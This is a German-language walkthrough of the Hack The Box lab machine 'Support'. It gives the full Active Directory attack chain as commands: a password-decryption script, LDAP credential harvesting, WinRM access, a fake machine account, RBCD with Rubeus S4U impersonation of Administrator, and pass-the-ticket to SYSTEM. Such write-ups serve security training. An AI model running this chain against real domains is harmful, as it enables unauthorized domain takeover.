# Hack The Box - Support (Deutsches Walkthrough)

## Synopsis

Support ist eine Easy-Windows-Maschine mit Fokus auf SMB Enumeration, LDAP Abuse und einer klassischen Resource-Based Constrained Delegation Eskalation. Initial führt ein anonym zugängliches SMB-Share zu einer .NET-Anwendung, deren Reverse Engineering LDAP-Credentials offenlegt. Über LDAP Enumeration wird das Passwort des Users `support` aus einem `info`-Attribut gewonnen und per WinRM Zugriff erreicht.

Für Privilege Escalation zeigt BloodHound, dass die Gruppe `Shared Support Accounts` `GenericAll`-Rechte auf dem Domain Controller besitzt. Diese Fehlkonfiguration erlaubt einen RBCD-Angriff, über den Administrator impersoniert und SYSTEM-Zugriff erreicht wird.

## Enumeration

### Nmap

```text
nmap -sC -sV -Pn 10.129.178.26
```

**Interessante Dienste:**
- 389 LDAP
- 636 LDAPS
- 445 SMB
- 5985 WinRM

Da kein Webdienst relevant erscheint, liegt der Fokus auf SMB.

**Shares prüfen:**
```text
smbclient -L //10.129.178.26/
```

**Interessant:**
- `support-tools`

**Verbinden:**
```text
smbclient //10.129.178.26/support-tools
```

Dateien listen.

**Auffällig:**
- `UserInfo.exe.zip`

**Download:**
```text
get UserInfo.exe.zip
unzip UserInfo.exe.zip
file UserInfo.exe
```

- PE32 `.NET Assembly`

## Foothold

### Reverse Engineering `UserInfo.exe`

**Mit ILSpy dekompilieren:**
```text
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
unzip Linux.x64.Release.zip
unzip ILSpy-linux-x64-Release.zip
cd artifacts/linux-arm64
sudo ./ILSpy
```

**Im Code auffällig:**
```text
LDAP://support.htb
support\ldap
Protected.getPassword()
```

**Hosts ergänzen:**
```text
echo '10.129.178.26 support.htb' | sudo tee -a /etc/hosts
```

Passwort ist XOR-verschlüsselt.

### Python-Decryption

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223
res = ''

for e, k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)

print(res)
```

**Ausführen:**
```text
python3 decrypt.py
```

**Credential:**
- `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### LDAP Enumeration

```text
sudo apt install ldap-utils
```

**Bind:**
```text
ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

User-Objekte untersuchen.

**Interessant:**
- `CN=users`
- `support`

**Attribut:**
- `info: Ironside47pleasure40Watchful`

Das ist das Passwort des `support`-Users.

### WinRM Zugriff

```text
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

**User Shell:**
- `support\support`

**User Flag:**
```text
C:\Users\Support\Desktop\user.txt
```

## Privilege Escalation

### Domain Enumeration

```powershell
Get-ADDomain
```

**Domain Controller:**
- `dc.support.htb`

**Hosts ergänzen:**
```text
echo '10.129.178.26 dc.support.htb' | sudo tee -a /etc/hosts
```

**Gruppen prüfen:**
```text
whoami /groups
```

**Interessant:**
- `Shared Support Accounts`
- `Authenticated Users`

### BloodHound

**Neo4j:**
```text
sudo apt install -y neo4j
sudo neo4j start
```

**BloodHound:**
```text
unzip BloodHound-linux-x64.zip
./BloodHound-linux-x64/BloodHound
```

**SharpHound sammeln:**
```text
upload SharpHound.exe
./SharpHound.exe
download 20221217070128_BloodHound.zip
```

Zip in BloodHound laden.

**Pfad zeigt:**
- `Shared Support Accounts -> GenericAll -> DC`

RBCD möglich.

### Voraussetzungen prüfen

**MachineAccountQuota:**
```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

**Delegation leer prüfen:**
```powershell
. ./PowerView.ps1
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

Attribut leer.

### Fake Computer erstellen

**Powermad laden:**
```powershell
. ./Powermad.ps1
```

**Computer erzeugen:**
```powershell
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

**Verifizieren:**
```powershell
Get-ADComputer -Identity FAKE-COMP01
```

SID merken.

### RBCD konfigurieren

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

**Prüfen:**
```powershell
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

Delegation gesetzt.

### S4U Attack

**RC4 Hash erzeugen:**
```text
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

**S4U2Self / S4U2Proxy:**
```text
Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

Administrator-Ticket erhalten.

### Pass-The-Ticket

**Ticket lokal konvertieren:**
```text
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

**SYSTEM Shell:**
```text
NT AUTHORITY\SYSTEM
C:\Users\Administrator\Desktop\root.txt
```

## Angriffskette Kurzüberblick

- Anonymous SMB
- `UserInfo.exe` Reverse Engineering
- LDAP Credential Recovery
- Passwort-Leak für `support`
- WinRM Access
- BloodHound `GenericAll` Path
- Fake Computer Object
- RBCD Abuse
- S4U2Self / S4U2Proxy
- Pass-The-Ticket
- SYSTEM
